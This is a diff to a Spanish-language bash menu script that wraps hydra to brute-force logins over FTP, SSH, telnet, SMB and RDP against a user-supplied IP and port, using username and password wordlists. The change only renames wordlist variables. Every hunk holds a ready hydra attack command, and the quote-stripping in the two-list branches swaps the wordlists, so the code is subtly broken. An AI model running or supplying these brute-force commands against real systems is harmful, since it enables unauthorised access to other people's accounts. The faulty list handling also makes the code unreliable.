@@ -48,9 +48,9 @@ read -p " [*] Elige una opcion: " opc1
 								coma="'"
 								if [ $primera = $coma ]
 									then
-										fich1=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
+										dicc1=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
 								fi
-                                sudo hydra -l $usr -P $fich1 ftp://$Ip:$puerto -t 4 -f -V -I
+                                sudo hydra -l $usr -P $dicc1 ftp://$Ip:$puerto -t 4 -f -V -I
                                 ;;
                             2 )	echo
                                 primera=`echo $dicc1 | head -c 1`
@@ -58,13 +58,13 @@ read -p " [*] Elige una opcion: " opc1
 								coma="'"
 								if [ $primera = $coma ]
 									then
-										fich1=`echo $dicc2 | cut -c 2- | rev | cut -c2- | rev`
+										dicc1=`echo $dicc2 | cut -c 2- | rev | cut -c2- | rev`
 								fi
 								if [ $segunda = $coma ]
 									then
-										fich2=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
+										dicc2=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
 								fi
-                                sudo hydra -L $fich2 -P $fich1 ftp://$Ip:$puerto -t 4 -f -V -I
+                                sudo hydra -L $dicc2 -P $dicc1 ftp://$Ip:$puerto -t 4 -f -V -I
                                 ;;
                             * )	echo
                                 echo "$RRPLY No es una opcion valida"
@@ -96,9 +96,9 @@ read -p " [*] Elige una opcion: " opc1
 								coma="'"
 								if [ $primera = $coma ]
 									then
-										fich1=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
+										dicc1=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
 								fi
-                                sudo hydra -l $usr -P $fich1 ssh://$Ip:$puerto -t 4 -f -V -I
+                                sudo hydra -l $usr -P $dicc1 ssh://$Ip:$puerto -t 4 -f -V -I
                                 ;;
                             2 )	echo
                                 primera=`echo $dicc1 | head -c 1`
@@ -106,13 +106,13 @@ read -p " [*] Elige una opcion: " opc1
 								coma="'"
 								if [ $primera = $coma ]
 									then
-										fich1=`echo $dicc2 | cut -c 2- | rev | cut -c2- | rev`
+										dicc1=`echo $dicc2 | cut -c 2- | rev | cut -c2- | rev`
 								fi
 								if [ $segunda = $coma ]
 									then
-										fich2=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
+										dicc2=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
 								fi
-                                sudo hydra -L $fich2 -P $fich1 ssh://$Ip:$puerto -t 4 -f -V -I
+                                sudo hydra -L $dicc2 -P $dicc1 ssh://$Ip:$puerto -t 4 -f -V -I
                                 ;;
                             * )	echo
                                 echo "$RRPLY No es una opcion valida"
@@ -144,9 +144,9 @@ read -p " [*] Elige una opcion: " opc1
 								coma="'"
 								if [ $primera = $coma ]
 									then
-										fich1=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
+										dicc1=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
 								fi
-                                sudo hydra -l $usr -P $fich1 telnet://$Ip:$puerto -t 4 -f -V -I
+                                sudo hydra -l $usr -P $dicc1 telnet://$Ip:$puerto -t 4 -f -V -I
                                 ;;
                             2 )	echo
                                 primera=`echo $dicc1 | head -c 1`
@@ -154,13 +154,13 @@ read -p " [*] Elige una opcion: " opc1
 								coma="'"
 								if [ $primera = $coma ]
 									then
-										fich1=`echo $dicc2 | cut -c 2- | rev | cut -c2- | rev`
+										dicc1=`echo $dicc2 | cut -c 2- | rev | cut -c2- | rev`
 								fi
 								if [ $segunda = $coma ]
 									then
-										fich2=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
+										dicc2=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
 								fi
-                                sudo hydra -L $fich2 -P $fich1 telnet://$Ip:$puerto -t 4 -f -V -I
+                                sudo hydra -L $dicc2 -P $dicc1 telnet://$Ip:$puerto -t 4 -f -V -I
                                 ;;
                             * )	echo
                                 echo "$RRPLY No es una opcion valida"
@@ -192,9 +192,9 @@ read -p " [*] Elige una opcion: " opc1
 								coma="'"
 								if [ $primera = $coma ]
 									then
-										fich1=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
+										dicc1=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
 								fi
-                                sudo hydra -l $usr -P $fich1 smb://$Ip:$puerto -t 4 -f -V -I
+                                sudo hydra -l $usr -P $dicc1 smb://$Ip:$puerto -t 4 -f -V -I
                                 ;;
                             2 )	echo
                                 primera=`echo $dicc1 | head -c 1`
@@ -202,13 +202,13 @@ read -p " [*] Elige una opcion: " opc1
 								coma="'"
 								if [ $primera = $coma ]
 									then
-										fich1=`echo $dicc2 | cut -c 2- | rev | cut -c2- | rev`
+										dicc1=`echo $dicc2 | cut -c 2- | rev | cut -c2- | rev`
 								fi
 								if [ $segunda = $coma ]
 									then
-										fich2=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
+										dicc2=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
 								fi
-                                sudo hydra -L $fich2 -P $fich1 smb://$Ip:$puerto -t 4 -f -V -I
+                                sudo hydra -L $dicc2 -P $dicc1 smb://$Ip:$puerto -t 4 -f -V -I
                                 ;;
                             * )	echo
                                 echo "$RRPLY No es una opcion valida"
@@ -240,9 +240,9 @@ read -p " [*] Elige una opcion: " opc1
 								coma="'"
 								if [ $primera = $coma ]
 									then
-										fich1=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
+										dicc1=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
 								fi
-                                sudo hydra -l $usr -P $fich1 rdp://$Ip:$puerto -t 4 -f -V -I
+                                sudo hydra -l $usr -P $dicc1 rdp://$Ip:$puerto -t 4 -f -V -I
                                 ;;
                             2 )	echo
                                 primera=`echo $dicc1 | head -c 1`
@@ -250,13 +250,13 @@ read -p " [*] Elige una opcion: " opc1
 								coma="'"
 								if [ $primera = $coma ]
 									then
-										fich1=`echo $dicc2 | cut -c 2- | rev | cut -c2- | rev`
+										dicc1=`echo $dicc2 | cut -c 2- | rev | cut -c2- | rev`
 								fi
 								if [ $segunda = $coma ]
 									then
-										fich2=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
+										dicc2=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
 								fi
-                                sudo hydra -L $fich2 -P $fich1 rdp://$Ip:$puerto -t 4 -f -V -I
+                                sudo hydra -L $dicc2 -P $dicc1 rdp://$Ip:$puerto -t 4 -f -V -I
                                 ;;
                             * )	echo
                                 echo "$RRPLY No es una opcion valida"
